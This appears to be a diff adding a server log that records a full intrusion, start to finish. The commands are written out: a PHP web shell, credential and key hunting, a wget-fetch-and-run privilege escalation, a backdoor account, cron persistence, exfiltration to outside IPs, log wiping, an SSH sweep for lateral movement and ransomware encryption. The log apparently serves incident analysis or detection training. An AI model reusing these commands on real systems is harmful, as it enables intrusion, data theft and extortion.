@@ -1,0 +1,31 @@
+2024-11-02 02:14:01 [INFO] Apache/2.4.41 POST /upload.php 200 - 10.0.0.23
+2024-11-02 02:14:02 [WARN] ModSecurity: Access denied. Pattern match "base64_decode" in REQUEST_BODY.
+2024-11-02 02:14:05 [INFO] PHP: eval() called — file=/var/www/html/upload.php line=12
+2024-11-02 02:14:08 [INFO] shell_exec: 'id' → uid=33(www-data) gid=33(www-data)
+2024-11-02 02:14:11 [INFO] shell_exec: 'uname -a' → Linux web01 5.4.0-182-generic #202-Ubuntu SMP
+2024-11-02 02:14:15 [INFO] shell_exec: 'cat /etc/passwd'
+2024-11-02 02:14:18 [INFO] shell_exec: 'find / -name "*.pem" -o -name "id_rsa" 2>/dev/null'
+2024-11-02 02:14:22 [INFO] shell_exec: 'ps aux'
+2024-11-02 02:14:25 [INFO] shell_exec: 'netstat -antp'
+2024-11-02 02:14:30 [WARN] Outbound connection: 10.0.0.23:33010 → 91.108.4.167:443
+2024-11-02 02:14:32 [INFO] curl POST https://91.108.4.167/exfil — 14.2 KB sent
+2024-11-02 02:14:35 [INFO] shell_exec: 'wget http://185.220.101.45:8080/lpe.sh -O /tmp/.x && chmod +x /tmp/.x && /tmp/.x'
+2024-11-02 02:15:01 [CRIT] Privilege escalation detected: www-data → root (CVE-2021-4034)
+2024-11-02 02:15:05 [INFO] root: 'useradd -M -s /bin/bash -G sudo backdoor_user'
+2024-11-02 02:15:08 [INFO] root: 'echo backdoor_user:S3cur3P@ss >> /etc/shadow'
+2024-11-02 02:15:10 [INFO] root: 'crontab -l | { cat; echo "*/5 * * * * /tmp/.x"; } | crontab -'
+2024-11-02 02:15:15 [INFO] root: 'iptables -A INPUT -s 185.220.101.45 -j ACCEPT'
+2024-11-02 02:15:18 [INFO] root: 'iptables -A OUTPUT -d 185.220.101.45 -j ACCEPT'
+2024-11-02 02:15:20 [INFO] root: 'tar czf /tmp/loot.tar.gz /home /var/backups /etc/nginx/ssl/'
+2024-11-02 02:15:35 [INFO] Outbound transfer: /tmp/loot.tar.gz → 185.220.101.45:443 (38.7 MB)
+2024-11-02 02:15:50 [INFO] root: 'rm -f /tmp/loot.tar.gz /tmp/.x /tmp/lpe.sh'
+2024-11-02 02:15:52 [INFO] root: 'find /var/log -name "*.log" -newer /tmp/.x -delete'
+2024-11-02 02:15:55 [INFO] root: 'history -c && unset HISTFILE'
+2024-11-02 02:16:00 [INFO] SSH session opened: root@10.0.0.23 from 185.220.101.45 port 22
+2024-11-02 02:16:05 [INFO] root: 'ssh-keygen -t rsa && cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys'
+2024-11-02 02:16:10 [INFO] root: 'for h in 10.0.0.{1..254}; do ssh -o StrictHostKeyChecking=no $h id 2>/dev/null; done'
+2024-11-02 02:16:45 [WARN] Lateral movement: SSH login root@10.0.0.31 from 10.0.0.23
+2024-11-02 02:16:46 [WARN] Lateral movement: SSH login root@10.0.0.55 from 10.0.0.23
+2024-11-02 02:16:47 [WARN] Lateral movement: SSH login root@10.0.0.101 from 10.0.0.23
+2024-11-02 02:17:00 [CRIT] Ransomware behavior: mass rename *.pem→*.locked, *.db→*.locked, *.bak→*.locked
+2024-11-02 02:17:05 [CRIT] Ransom note written: /var/www/html/RANSOM_NOTE.txt
